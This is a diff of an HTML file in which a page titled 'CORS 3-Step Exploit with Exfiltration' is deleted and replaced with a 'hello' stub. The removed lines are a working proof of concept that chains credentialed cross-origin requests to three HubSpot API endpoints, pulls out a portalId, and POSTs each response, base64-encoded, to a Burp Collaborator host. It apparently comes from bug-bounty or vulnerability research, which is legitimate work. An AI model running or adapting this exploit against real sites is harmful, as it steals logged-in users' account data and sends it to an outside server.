@@ -1,101 +1,10 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>CORS 3-Step Exploit with Exfiltration</title>
+   
   </head>
   <body>
-    <h1>CORS Exploit with Exfiltration</h1>
-    <button onclick="runExploit()">Run Exploit</button>
-    <pre id="log"></pre>
-    <script>
-     
-
-      function log(msg) {
-        document.getElementById("log").textContent += msg + "\n";
-      }
-
-     
-
-      // Send exfiltrated data to Burp Collaborator
-      function exfil(stage, data) {
-        fetch("https://prk27k9tlslb01fdvj361ta4ivolca.oastify.com", {
-          method: "POST",
-          mode: "no-cors", // prevents CORS issues for sending data out
-          body: JSON.stringify({
-            stage: stage,
-            data: btoa(unescape(encodeURIComponent(data))) // base64 encode
-          })
-        });
-      }
-
-function runExploit() {
-  const xhr1 = new XMLHttpRequest();
-  xhr1.open("GET", "https://app-eu1.hubspot.com/api/accounts/v1/basic-accounts/pinned", true);
-  xhr1.withCredentials = true;
-  xhr1.setRequestHeader("Content-Type", "application/json");
-  
-
-  xhr1.onreadystatechange = function () {
-    if (xhr1.readyState === XMLHttpRequest.DONE) {
-      log("[+] Step 1 - GET portal info response:");
-      log(xhr1.responseText);
-      exfil("step1-get-portal-info", xhr1.responseText);
-
-      let portalId = null;
-      try {
-  const json = JSON.parse(xhr1.responseText);
-  portalId = json.basicAccounts?.[0]?.id
-  log(`[+] Extracted portalId: ${portalId}`);
-} catch (e) {
-  log("[-] Failed to parse portalId: " + e.message);
-  return;
-}
-console.log(portalId)
-      if (!portalId) {
-        log("[-] No portalId found.");
-        return;
-      }
-
-      
-      const xhr2 = new XMLHttpRequest();
-      const postUrl = `https://app-eu1.hubspot.com/login-verify/hub-user-info?portalId=${portalId}`;
-      xhr2.open("GET", postUrl, true);
-      xhr2.withCredentials = true;
-      xhr2.setRequestHeader("Content-Type", "application/json");
-      
-      
-      xhr2.onreadystatechange = function () {
-        if (xhr2.readyState === XMLHttpRequest.DONE) {
-          log(xhr2.responseText);
-          exfil("step2-post-add-user", xhr2.responseText);
-
-
-          
-          const xhr3 = new XMLHttpRequest();
-          const putUrl = `https://app-eu1.hubspot.com/api/meetings/v1/link?portalId=${portalId}`;
-          xhr3.open("GET", putUrl, true);
-          xhr3.withCredentials = true;
-          xhr3.setRequestHeader("Content-Type", "application/json");
-          
-
-          xhr3.onreadystatechange = function () {
-            if (xhr3.readyState === XMLHttpRequest.DONE) {
-              log("\n[+] Step 3 - PUT update response:");
-              log(xhr3.responseText);
-              exfil("step3-put-settings", xhr3.responseText);
-            }
-          };
-
-          xhr3.send();
-        }
-      };
-
-      xhr2.send();
-    }
-  };
-
-  xhr1.send();
-}
-    </script>
+    <h1>hello</h1>
+    
   </body>
 </html>
